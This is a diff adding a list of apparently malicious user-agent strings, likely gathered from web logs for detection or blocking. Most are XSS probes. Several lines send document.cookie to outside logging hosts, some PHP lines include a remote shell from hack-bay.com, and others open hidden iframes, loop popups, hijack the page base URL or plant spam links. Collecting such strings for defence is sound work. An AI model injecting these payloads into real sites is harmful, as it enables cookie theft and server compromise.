@@ -1,0 +1,140 @@
+&quot;&lt;script&gt;alert(/hi/)&lt;/script&gt;&quot; 
+&quot;&gt;'&gt;&lt;script&gt;&lt;?php include('http://hack-bay.com/Shells/gny.txt?'); ?&gt;&... 
+&quot;&gt;'&gt;&lt;script&gt;alert(123)&lt;/script&gt; 
+&quot;&gt;'&gt;&lt;script&gt;alert(123)&lt;/script&gt; FirePHP/0.3 
+&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 
+'';!--"&lt;&gt;=&{()}&lt;a href="http://cstrikedownload.xtgem.com"&gt;online java game&lt;/a&gt;
+&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+"&gt;'&gt;&lt;script&gt;&lt;?php include('http://hack-bay.com/Shells/gny.txt?'); ?&gt;&lt;/script&gt;
+'';!--"&lt;&gt;=&{()}&lt;a href="http://cstrikedownload.xtgem.com"&gt;online java game&lt;/a&gt;
+'';!--"&lt;&gt;=&{()}&lt;a href="http://google.com"&gt;online java game&lt;/a&gt;
+'';!--"&lt;&gt;=&{()}&lt;a href="http://unicornleapfrog.com/Shooting/UFOS"&gt;online java game&lt;/a&gt;
+--&gt;&lt;script&gt;alert('pwned') 
+/ \ " &lt;br&gt; &lt;a href="http://www.bash.ch/"&gt;www.bash.ch&lt;/a&gt;
+;'"&gt;&lt;script&gt;window.location="http://trizen.home.ro/test.html"&lt;/script&gt;&lt;noscript&gt;
+?&lt;script.error?/?danish? (sjc0.tdmsic.org - Red Hat) 
+Botix/0.1 (&lt;a href=&quot;http://botix.org/robot&quot;&gt;http://botix.org/robot&lt;/a&gt;) 
+http://www.google.com/"&gt;&lt;script&gt;a='%67%6f%6f%67%6c%65%5f%61%64%5f%63%6c%69%65%6e%74%3d%27%70%75%62%2d%35%36%38%37%38%31%31%37%37%39%33%35%38%33%31%32%27%3b%67%6f%6f%67%6c%65%5f%61%64%5f%77%69%64%74%68
+Internet Explorer 7&lt;script&gt;document.write("&lt;img src=\"http://members.lycos.nl/opslga4vshop/logje.php?id="+document.cookie+"/&gt;");&lt;/script&gt;
+IP2LocationBot/1.00 &lt;a href="http://www.ip2location.com"&gt;http://www.ip2location.com&lt;/a&gt;
+IP2MapBot/1.3 &lt;a href=http://www.ip2map.com&gt;http://www.ip2map.com&lt;/a&gt;
+Lite-Nav/1.01 ( &lt;a href=&quot;http://gashnark.com/&quot;&gt;http://gashnark.com&lt;/a&gt; ) 
+&lt;script&gt;http://www.youtube.com/watch?v=ueY6yBcKKgE&lt;/script&gt; Mozilla/5.0 (Windows NT 6.2; Win128; x128; rv:2.0b10pre) Gecko/20110119 Firefox/4.0b10pre
+ Lite-Nav/1.02 ( &lt;a href=&quot;http://gashnark.com/&quot;&gt;http://gashnark.com&lt;/a&gt; ) 
+Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+&lt;script&gt;for (x in document.write) { document.write(x);}&lt;/script&gt; 
+Mozilla/5.0 (compatible; AhrefsBot/1.0; +http://ahrefs.com/robot/) 
+Mozilla/5.0 (compatible; MSIE 6.0; Windows XP) Èãðàéêà &lt;a href=http://igrayka.info&gt;òóò&lt;/a&gt; 
+Mozilla/5.0 (compatible; AhrefsBot/2.0; +http://ahrefs.com/robot/) 
+&lt;script&gt;document.print('&lt;img href=”http://55329.glrdmd.eu/admin/2.php?q='+document.cookie);&lt;/script&gt;
+Mozilla/5.0 (compatible; en-US; &lt;a href='http://gnomit.com/'&gt;Gnomit&lt;/a&gt;) Gnomit/1.0 
+Opera/8.01 (J2ME/MIDP; Opera Mini/&lt;script&gt;alert('kuda-liar');&lt;/1724; id; U; ssr) 
+&lt;script&gt;alert(/hi/)&lt;/script&gt; &lt;script&gt;http://www.youtube.com/watch?v=ueY6yBcKKgE&lt;script&gt; Mozilla/5.0 (Windows NT 6.2; Win128; x128; rv:2.0b10pre) Gecko/20110119 Firefox/4.0b10pre
+&lt;script&gt;document.print('&lt;img href=â¬ document.location=String.fromCharCode(104,116,116,112,58,47,47,118,111,116,101,98,97,110,100,46,110,101,116,47,98,101,101,102,47,104,111,111,107,47,120,115,115,45,
+&lt;script&gt;document.write('&lt;iframe src="http://www.crashie8.com" width="0" height="0" /&gt;');&lt;/script&gt;
+Opera/8.01 (J2ME/MIDP; Opera Mini/&lt;script&gt;location.href='http:/1724; id; U; ssr) 
+Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 &lt;a href=http:/22.414; U; en) Presto/2.5.25 Version/10.54 
+&lt;a href=&quot;http://www.mynickname.org&quot;&gt;List of Nickname&lt;/a&gt; 
+&lt;/a&gt;&lt;a href='http://www.webtoaster.com'&gt;WebToaster&lt;/a&gt; - WebToaster V0.9 Alpha 
+&lt;script&gt;alert&lt;/script&gt; 
+&lt;script&gt;alert(/XSS/);&lt;/script&gt; 
+&lt;script&gt;alert(javascript:(document.location="http://www.enigmagroup.org/missions/basics/xss/2/"););&lt;/script&gt;
+&lt;script&gt;alert(/xss/)&lt;/script&gt; 
+&lt;script&gt;alert(javascript:(document.location="http://www.enigmagroup.org/missions/basics/xss/2/"););&lt;/script&gt;
+&lt;script&gt;alert(1);&lt;/script&gt; 
+&lt;script&gt;document.print('&lt;img href=”http://55329.glrdmd.eu/admin/2.php?q='+document.cookie);&lt;/script&gt;
+&lt;script&gt;alert(1)&lt;/script&gt; 
+&lt;script&gt;document.print('&lt;img href=â€http://44.vg/log.php?q='+document.cookie);&lt;/script&gt;
+&lt;script&gt;alert(document.cookie);&lt;/script&gt; 
+&lt;script&gt;top.location.href='http://txt2pic.com'&lt;/script&gt;&lt;a href='http://www.comedysearchengine.com'&gt; (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.
+&lt;script&gt;location.href='http://mihailfedorov.ru';&lt;/script&gt; 
+&lt;script&gt;top.location.href='http://txt2pic.com'&lt;/script&gt;&lt;a href='http://www.comedysearchengine.com'&gt; (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.
+&lt;script&gt;Mozilla(/XSS/);&lt;/script&gt; 
+&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+&lt;script&gt;window.location = 'http://blackhatgonegood.110mb.com/itworks.php?cookie=' + document.cookie;&lt;/script&gt;
+&lt;script&gt;window.location =&quot;http://bushranger.netii.net&quot;;&lt;/script&gt; 
+&lt;a href=&quot;http://youtubeavi.com&quot;&gt;http://youtubeavi.com/alexa&lt;/a&gt; 
+&lt;script&gt;alert('This site has a XSS vulnerability, it\'s trying to display the user agent back to the user somewhere.')&lt;/script&gt;
+&lt;script&gt;alert('sgt')&lt;/script&gt; 
+&lt;script&gt;alert(/hi/)&lt;/script&gt; &lt;script&gt;http://www.youtube.com/watch?v=ueY6yBcKKgE&lt;script&gt; Mozilla/5.0 (Windows NT 6.2; Win128; x128; rv:2.0b10pre) Gecko/20110119 Firefox/4.0b10pre
+&lt;script&gt;alert('sickshot wuz here');&lt;/script&gt; 
+&lt;SCRIPT&gt;window.location='http://txt2pic.com'&lt;/script&gt; (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; .NET CLR 1.1.4322)
+&lt;script&gt;alert('TriZeN Was Here in 13 December 2009');&lt;/script&gt; 
+&lt;script&gt;window.location='http://somewhere'&lt;/script&gt; (compatible; MSIE 7.0;) 
+&lt;script&gt;alert('TriZeN');&lt;/script&gt; 
+&lt;SCRIPT&gt;window.location='http://www.sirseek.com'&lt;/script&gt; (compatible; MSIE 7.0; Windows NT 6.0; SV1; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; InfoPath.2; .NET CLR 1.1.4322)
+&lt;script&gt;alert('XSS Injection!')&lt;/script&gt; 
+&lt;SCRIPT&gt;window.location='http://www.sirseek.com'&lt;/script&gt; (compatible; MSIE 7.0; Windows NT 5.1; FunWebProducts; .NET CLR 1.1.4322)
+&lt;sCrIpT&gt;alert('XSS');&lt;/ScRiPt&gt; 
+&lt;SCRIPT&gt;window.location='http://www.syncrisis.com'&lt;/script&gt; (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)
+&lt;script&gt;alert('XSS')&lt;/script&gt; 
+&lt;script&gt;window.open('http://www.txt2pic.com')&lt;/script&gt; 
+&lt;script&gt;alert(/&quot;XSS&quot;/);&lt;/script&gt; 
+?&gt;&lt;?php phpinfo(); ?&gt;&lt;script&gt;alert('xssmofo');&lt;/script&gt;&lt;% response.write("&lt;h1&gt;&lt;script&gt;alert('ou');&lt;/script&gt;fuuuasp&lt;/h1&gt;") %&gt;
+&lt;script&gt;alert(/hi/)&lt;/script&gt; 
+&lt;script&gt;alert('SoulBlack')&lt;/script&gt; 
+{Opera/9.80|Mozilla/4.0|Mozilla/5.0} &lt;a href="http://www.daferp.com"&gt;programa de gestion rutas&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+&lt;script&gt;alert('Rex')&lt;/script&gt;'; phpinfo(); echo '&lt;iframe src="http://www.google.com"&gt;&lt;/iframe&gt;
+Mozilla/4.0 &lt;a href=http://adhesivezone.com/7277/adhesives/dry-erase-self-adhesive-vinyl/&gt;cool blog&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+&lt;script&gt;alert('document.cookie);&lt;/script&gt; 
+Mozilla/4.0 &lt;a href=http://search.engine-optimization.gr/seo-marketing/off-page-ranking-factors/&gt;????? ???????????&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+&lt;script&gt;alert('foo');&lt;/script&gt; 
+Mozilla/4.0 &lt;a href=http://visualimpactmuscle.net/visual-impact-muscle-videos/shoulder-exercises-the-3-best-rear-shoulder-exericses/&gt;Building muscle&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10
+&lt;script&gt;alert('Haha')&lt;/script&gt; 
+Mozilla/4.0 &lt;a href=http://www.CheapVerizonCellPhones.org&gt;Used Verizon Cell Phones&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+&lt;script&gt;alert('httpHeader.injection detected!!!');&lt;/script&gt; 
+Mozilla/4.0 &lt;a href=http://www.r-domain.net/mobivet.pl&gt;weterynarz&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+&lt;script&gt;alert('mok');&lt;/script&gt; 
+Mozilla/4.0 &lt;a href=http://www.shopprice.de&gt;Stromvergleich&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+&lt;script&gt;alert('pwned')&lt;/script&gt; 
+Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Windows NT 5.1; SV1; FunWebProducts; &lt;a href=http://browsezilla.org&gt;Browsezilla&lt;/a&gt;; ###579887791815768750878846###; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+Mozilla/4.0 &lt;a href="http://540.xg4ken.com/media/redir.php?prof=3&camp=229&affcode=kw46938655&cid=18115555793&networkType=search&url%5B%5D=http%3A//1155.xg4ken.com"&gt;Look&lt;/a&gt; (Windows NT 5.1; U; en) Pr
+&lt;script type=&quot;text/javascript&quot;&gt;alert('lololol');&lt;/script&gt; 
+Mozilla/4.0 &lt;a href="http://avenuel.tistory.com/1307?_best_tistory=trackback_bestpost"&gt;great site&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+&lt;script&gt; alert(&quot;This Site is XSSible!&quot;); &lt;/script&gt; 
+&lt;script&gt; while (true) { window.open(window.location); } &lt;/script&gt; 
+&lt;script&gt; while (true) { window.open(window.location); } &lt;/script&gt;,gzip(gfe) (via translate.g... 
+&lt;script&gt;(function(){ function arguments() { } }())&lt;/script&gt; 
+&lt;script&gt;alert (document.cookie);&lt;/script&gt; 
+&lt;script&gt;alert(&quot;BOOOOOM&quot;)&lt;/script&gt; 
+&lt;script&gt;alert(&quot;HACKED&quot;)&lt;/script&gt; 
+&lt;script&gt;alert(&quot;hoi&quot;)&lt;/script&gt; 
+&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt; 
+Opera/9.80 &lt;a href="http://www.9tattoos.com"&gt;tattoos&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+Opera/9.80 &lt;a href="http://www.backup-4.com"&gt;backup software&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+Opera/9.80 &lt;a href="http://www.ebook-123.com/Mind-Movies-Mindvideos:::16.html"&gt;Mindvideo&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+Opera/9.80 &lt;a href="http://www.makingcolloidalsilver.org/"&gt;Collodial Silver&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+&lt;script type=&quot;Text/Java script&quot;&gt; 
+Opera/9.80 &lt;a href="http://www.cityvillebot.info"&gt;City Ville Booster&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+Opera/9.80 &lt;a href="http://youtu.be/yOmUY9c1wD4"&gt;click here&lt;/a&gt; (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
+&lt;a href=http://www.courbis.fr&gt;Courbis vous offre la meteo du RER&lt;/a&gt; 
+&lt;a href=http://www.courbis.fr&gt;Courbis, Acteur de l'Internet depuis 1988&lt;/a&gt; 
+&lt;a href=http://www.courbis.fr&gt;Courbis, logiciels gratuits pour Pabx Alcatel 4400&lt;/a&gt; 
+&lt;a href=http://www.courbis.fr&gt;Courbis, trucs et astuces pour la Varadero 125&lt;/a&gt; 
+&lt;a href=http://www.courbis.fr&gt;Courbis, trucs et astuces pour le Tomtom Rider&lt;/a&gt; 
+&lt;a href=http://www.courbis.fr&gt;Courbis presente Voyage au centre de la HP28&lt;/a&gt; 
+&lt;a href=http://www.courbis.fr&gt;Courbis presente Voyage au centre de la HP48&lt;/a&gt; 
+&lt;a href=http://www.courbis.fr&gt;Courbis presents a Journey to the Center of the HP48&lt;/a&gt; 
+&lt;a href=http://fr.wikipedia.org/wiki/Rolland_Courbis&gt;Allez les verts&lt;/a&gt; 
+&lt;a href=http://fr.wikipedia.org/wiki/Rolland_Courbis&gt;But but but&lt;/a&gt; 
+&lt;a href=http://fr.wikipedia.org/wiki/Rolland_Courbis&gt;C'est pas footu&lt;/a&gt; 
+&lt;a href=http://fr.wikipedia.org/wiki/Rolland_Courbis&gt;Courbis fait son trou (de balle)&lt;/a&gt; 
+&lt;a href=http://fr.wikipedia.org/wiki/Rolland_Courbis&gt;Courbis pousse la balle un peu loin&lt;/a&gt; 
+&lt;a href=http://fr.wikipedia.org/wiki/Rolland_Courbis&gt;Elle est ou la baballe&lt;/a&gt; 
+&lt;a href=http://fr.wikipedia.org/wiki/Rolland_Courbis&gt;Foot de fou&lt;/a&gt; 
+&lt;a href=http://fr.wikipedia.org/wiki/Rolland_Courbis&gt;Fou de foot&lt;/a&gt; 
+&lt;a href=http://fr.wikipedia.org/wiki/Rolland_Courbis&gt;Vive le foot avec Courbis&lt;/a&gt; 
+&lt;a href=&quot;scripts/buychapter.cgi?file=dvd133-c01-3m.zip&quot;&gt; 
+Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.0.10) Gecko/2009042316 &lt;script&gt;alert('xisigr')&lt;/script&gt;
+&lt;script&gt;$pwd&lt;/script&gt;
+%3C%2Fa%3E%3Ca+href%3D%22http%3A%2F%2Fnmap.org%22%3EAnother+Nmap+User-Agent
+&lt;script&gt;alert(&quot;Failed&quot;);&lt;/script&gt;
+&gt;&lt;!-- begin user supplied content (eBay) --&gt; omFG bai my boba fett dollz it totally sets u UP the bombz &lt;base href="http://evil.tld" mce_href="http://evil.tld"&gt; &lt;!-- end user supplied content (eBay) &lt;
+&lt;a href=http://rayyeargin.com/&gt;Abstract Art T-Shirt Designs&lt;/a&gt; 
+&lt;a href=http://rayyeargin.com/&gt;Modern Art T-Shirt Designs&lt;/a&gt; 
+&lt;a href=http://thenullpost.com/&gt;News for Mobiles | TheNullPost.com&lt;/a&gt;
+&lt;a href='http://www.unchaos.com/'&gt; UnChaos Bot Hybrid Web Search Engine. &lt;/a&gt; (vadim_gonchar@unchaos.com)
+&lt;a href="http://www.moy-posudu.ru/"&gt;pda&lt;/a&gt; http://www.moy-posudu.ru/
+----!&gt;&lt;script&gt;alert(&quot;lol&quot;);&lt;/script&gt;&lt;!----- 
+;'&quot;&gt;&lt;script&gt;window.location=&quot;http://4chan.on.nimp.org&quot;&lt;/script&am... 
+&lt;?php if(isset($_GET['dl']) && ($_GET['dl'] != "")){ $file == "on") $safemode = TRUE; else $spwd = $ else{ $pr.":" != $v) {$letter"&lt;a href=\"?y=".$pathz."&lt;span class=\"gaya\"&gt;ON&lt;$posix 
